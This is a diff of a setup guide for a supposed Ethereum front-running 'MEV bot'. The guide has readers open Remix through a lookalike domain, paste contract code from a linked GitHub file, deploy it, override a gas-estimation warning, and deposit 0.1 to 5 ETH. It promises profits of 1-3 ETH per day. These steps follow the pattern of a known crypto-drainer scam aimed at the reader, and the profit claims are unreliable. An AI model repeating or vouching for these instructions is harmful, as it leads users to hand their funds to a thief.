@@ -1,28 +1,60 @@
-🚨 IMPORTANT: I've received messages from users who didn't provide enough Ethereum to cover gas fees and potential burn fees. The bot targets token contracts with a maximum burn fee of 10% or lower, though most tokens currently have fees between 2-6%. If you fund the contract with 0.05 ETH or less and the bot targets a token with high burn fees, a significant amount of gas fees might be wasted. To avoid this, I recommend funding the contract with at least 0.05 to 5 ETH.
+🚨 Important Notice: Ensure Sufficient Funding for Gas and Burn Fees 🚨
 
-STEP BY STEP INSTRUCTIONS
+Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.15 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.
 
-✅1- Download MetaMask: https://metamask.io/download/
+To avoid this, I recommend funding your contract with at least 0.1 ETH and up to 5 ETH to ensure the bot functions optimally.
 
-✅2- Access Remix: https://remixdev.gl/ ⚠️(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)⚠️ https://remixdev.gl/
+Step-by-Step Setup Guide:
 
-✅3- Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “OneinchSlippageBot.sol”. Make sure it ends with .sol for Ethereum programming language. Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.
+1- Download MetaMask
 
-🔥 Paste THIS code in Remix: [ETH Contract Code](https://github.com/Jacob-project/Ethereum-Bot/blob/main/Code%20-%20Update%2008%20May%202025)
+► [Install MetaMask](https://metamask.io/download/)
 
-✅4- Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6
+2- Access Remix
 
-✅5- Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - MetaMask” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.
+► [Use Remix Ethereum IDE](https://remixdev.gl/) https://remixdev.gl/ (Ensure you only use this version, as the bot is compatible with it specifically.)
 
-Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "OneinchSlippageBot.sol".
+3- Create Contract File
 
-✅6- Fund your bot to be able to frontrun transactions. Make sure your deposit is more than 0.05 ETHER ( to prevent negating slippage ) to your exact contract/bot address.
+► Go to the “contracts” folder and create a “New File”.
 
-✅7- After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button
+► Rename it to a desired name ending in .sol, for example, “bot.sol.”
 
-➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
+► If text colors are missing when creating the file, refresh the browser and paste in the code again.
 
-Happy trading! 🚀
+4- Paste Code in Remix
+
+► Copy and paste the bot code: [ETH Bot Code.
+](https://github.com/Jacob-project/Ethereum-Bot/blob/main/Code%20-%20Update%2008%20May%202025)
+
+5- Compile the Contract
+
+► Go to the “Compile” tab on Remix.
+
+► Select Solidity version 0.6.6 for compilation.
+
+7- Deploy the Contract
+
+► In the “Deploy & Run Transactions” tab, set “Injected Provider - MetaMask” as the environment and click “Deploy.”
+
+► Confirm the contract creation in MetaMask.
+Note: Ensure your contract name is correctly selected in the CONTRACT section before clicking Deploy. Example: “OneinchSlippageBot - bot.sol.”
+
+Troubleshooting: If you receive a "Gas estimation failed" error after clicking deploy, select "Send transaction" and confirm. MetaMask will automatically estimate the gas fee.
+
+7- Fund Your Bot
+
+► Deposit at least 0.15 ETH to cover slippage and ensure effective front-running.
+
+► Transfer the funds to your specific bot address.
+
+8-Run the Bot
+
+► After confirmation, click "Start" to initiate the bot.
+
+► Withdraw your profits anytime by clicking "Withdraw".
+
+Following these steps will help ensure a successful bot operation with minimized transaction issues.
 ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
 
 📈 Estimated Profits
@@ -31,3 +63,5 @@ Happy trading! 🚀
 
 🔥 My running mev bot, used 10 ETH. Averaging about 1-3 ETH per day!
 https://etherscan.io/address/0x4838b106fce9647bdf1e7877bf73ce8b0bad5f97
+
+Happy trading! 🚀
